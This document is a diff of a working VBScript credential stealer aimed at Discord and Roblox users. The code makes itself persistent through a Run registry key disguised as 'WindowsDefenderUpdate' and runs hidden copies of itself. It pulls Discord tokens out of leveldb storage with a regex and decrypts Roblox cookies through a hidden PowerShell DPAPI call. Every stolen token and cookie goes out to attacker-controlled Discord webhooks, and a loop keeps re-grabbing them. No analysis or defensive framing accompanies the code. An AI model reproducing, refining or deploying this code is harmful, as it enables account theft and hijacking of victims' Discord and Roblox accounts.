@@ -1,4 +1,4 @@
-Dim sh, fso, WH_LOGS, WH_REGRAB, WH_ONLINE, PC, USER, cookiePath, lastCookie, isFirstRun, selfPath, tempPath
+Dim sh, fso, WH_LOGS, WH_REGRAB, WH_ONLINE, PC, USER, cookiePath, lastCookie, isFirstRun
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -9,19 +9,16 @@ WH_ONLINE = "https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0X
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 isFirstRun = True
-lastCookie = ""
 
 On Error Resume Next
-selfPath = WScript.ScriptFullName
-tempPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\wdu.vbs"
+Dim selfPath: selfPath = WScript.ScriptFullName
+Dim tempPath: tempPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\wdu.vbs"
 
-' Ping Online on EVERY startup (both original and temp copy)
-SendWebhook WH_ONLINE, "{""embeds"":[{""title"":""User Online"",""description"":""Client: " & PC & " / " & USER & """,""color"":65280}]}"
-
-' If running from original, copy to temp, set registry, grab tokens, and launch hidden temp copy
 If LCase(selfPath) <> LCase(tempPath) Then
     fso.CopyFile selfPath, tempPath, True
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", "wscript.exe //B """ & tempPath & """", "REG_SZ"
+    
+    SendWebhook WH_ONLINE, "{""embeds"":[{""title"":""User Online"",""description"":""Client: " & PC & " / " & USER & """,""color"":65280}]}"
     Call GrabTokens
     
     sh.Run "wscript.exe //B """ & tempPath & """", 0, False
@@ -29,7 +26,7 @@ If LCase(selfPath) <> LCase(tempPath) Then
 End If
 On Error Goto 0
 
-' Infinite Loop for Regrab
+lastCookie = ""
 Do
     Call GrabRoblox
     isFirstRun = False
@@ -48,16 +45,18 @@ Sub GrabRoblox()
     
     If cookie <> lastCookie Then
         lastCookie = cookie
-        Dim t: t = FormatDateTime(Now, 4)
+        Dim t: t = FormatDateTime(Now, 3) ' 3 = hh:mm:ss AM/PM local time
         
-        Dim embed: embed = "{""content"":""@everyone"",""embeds"":[{""title"":""Roblox (JSON-DPAPI)"",""description"":""Size: " & Len(cookie) & "\n" & PC & " / " & USER & "\n\n``````\n" & cookie & "\n``````"",""color"":65280,""footer"":{""text"":""Grabbed at " & t & """}}]}"
-        
+        Dim destWH
         If isFirstRun Then
-            SendWebhook WH_LOGS, embed
+            destWH = WH_LOGS
         Else
-            SendWebhook WH_REGRAB, embed
+            destWH = WH_REGRAB
         End If
         
+        Dim embed: embed = "{""content"":""@everyone"",""embeds"":[{""title"":""Roblox Cookie Grabbed"",""description"":""``````" & cookie & "``````"",""color"":65280,""footer"":{""text"":""Roblox Tracker • Grabbed at " & t & """}}]}"
+        
+        SendWebhook destWH, embed
         Call PostFile("cookie.txt", cookie)
     End If
 End Sub
@@ -70,9 +69,11 @@ Sub GrabTokens()
         sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordptb\Local Storage\leveldb", _
         sh.ExpandEnvironmentStrings("%APPDATA%") & "\Lightcord\Local Storage\leveldb" _
     )
+    
     Dim regex: Set regex = New RegExp
     regex.Pattern = "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
     regex.Global = True
+    
     For i = 0 To UBound(paths)
         If fso.FolderExists(paths(i)) Then
             For Each file In fso.GetFolder(paths(i)).Files
@@ -103,6 +104,7 @@ Function FindCookiePath()
             Exit Function
         End If
     Next
+    
     pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
     If fso.FolderExists(pk) Then
         Set folder = fso.GetFolder(pk)
@@ -121,12 +123,14 @@ End Function
 Function ExtractCookie(raw)
     ExtractCookie = ""
     Dim m: m = InStr(raw, "_|WARNING")
+    
     If m > 0 Then
         ExtractCookie = Mid(raw, m)
         Dim semi: semi = InStr(ExtractCookie, ";")
         If semi > 0 Then ExtractCookie = Left(ExtractCookie, semi - 1)
         Exit Function
     End If
+    
     If InStr(raw, "CookiesData") > 0 Then
         Dim sp2: sp2 = InStr(raw, """CookiesData""")
         If sp2 > 0 Then
@@ -180,20 +184,26 @@ Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dpi.txt"
     Dim outf: outf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dpo.txt"
+    
     Dim f1: Set f1 = fso.CreateTextFile(inf, True)
     f1.Write b64
     f1.Close
+    
     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
     Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dp.ps1"
+    
     Dim f2: Set f2 = fso.CreateTextFile(psf, True)
     f2.Write ps
     f2.Close
+    
     sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """", 0, True
+    
     If fso.FileExists(outf) Then 
         Dim f3: Set f3 = fso.OpenTextFile(outf, 1)
         DecryptDPAPI = f3.ReadAll
         f3.Close
     End If
+    
     fso.DeleteFile inf, True
     fso.DeleteFile psf, True
     fso.DeleteFile outf, True
